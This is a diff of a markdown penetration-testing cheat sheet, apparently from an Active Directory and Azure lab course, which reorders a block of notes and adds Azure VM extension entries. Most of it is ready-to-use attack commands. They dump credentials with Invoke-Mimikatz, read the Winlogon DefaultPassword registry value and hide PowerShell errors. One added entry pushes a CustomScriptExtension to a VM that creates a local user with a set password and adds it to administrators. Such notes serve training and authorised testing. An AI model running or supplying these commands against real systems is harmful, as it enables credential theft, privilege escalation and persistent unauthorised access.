@@ -1,34 +1,3 @@
-**Random**
-```
-xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share
-script -qc /bin/bash /dev/null
-```
-**Hide Error in PowerShell**
-```
-$ErrorActionPreference= 'silentlycontinue'
-```
-**Filtering Powershell objects**
-```
-Get-UserProperty -Properties logoncount | Where logoncount -ne 0
-```
-**Filtering Powershell objects**
-```
-Get-ObjectAcl -SamAccountName Control174User –ResolveGUIDs | Where-Object {$_.IdentityReference -like "RDP*"} 
-```
-**Creds**
-```
-Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "DefaultPassword"
-Invoke-Mimikatz -DumpCreds/-DumpCerts 
-```
-**Service Ticket Combos - https://adsecurity.org/?p=2011**
-**DC Time Sync**
-```
-proxychains net time set -S 172.16.3.5
-```
-**Expand Property**
-```
-(get-azvm | select -ExpandProperty networkprofile).NetworkInterfaces.id 
-```
 **AZURE**
 - **Check UserData**
 ```
@@ -57,4 +26,48 @@ Authorization = "Bearer $accessToken"
 ## Execute Rest API Call
 
 $Results = Invoke-RestMethod -Method Put -Uri $Url -Body $body -Headers $headers -ContentType 'application/json'
+```
+- **Check VM Extensions**
+```
+Get-AzVMExtension -ResourceGroupName Research -VMName infradminsrv
+```
+- **Set VM Extensions**
+```
+## Following permissions are required to create a custom script extension and read the output: "Microsoft.Compute/virtualMachines/extensions/write" and "Microsoft.Compute/virtualMachines/extensions/read"
+
+Set-AzVMExtension -ResourceGroupName Research -VMName infradminsrv -ExtensionName ExecCmd -Location germanywestcentral -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users student87 Stud87Password@123 /add /Y; net localgroup administrators student87 /add /Y"}'
+```
+
+
+**Random**
+```
+xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share
+script -qc /bin/bash /dev/null
+```
+**Hide Error in PowerShell**
+```
+$ErrorActionPreference= 'silentlycontinue'
+```
+**Filtering Powershell objects**
+```
+Get-UserProperty -Properties logoncount | Where logoncount -ne 0
+```
+**Filtering Powershell objects**
+```
+Get-ObjectAcl -SamAccountName Control174User –ResolveGUIDs | Where-Object {$_.IdentityReference -like "RDP*"} 
+```
+**Creds**
+```
+Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "DefaultPassword"
+Invoke-Mimikatz -DumpCreds/-DumpCerts 
+```
+**Service Ticket Combos - https://adsecurity.org/?p=2011**
+
+**DC Time Sync**
+```
+proxychains net time set -S 172.16.3.5
+```
+**Expand Property**
+```
+(get-azvm | select -ExpandProperty networkprofile).NetworkInterfaces.id 
 ```
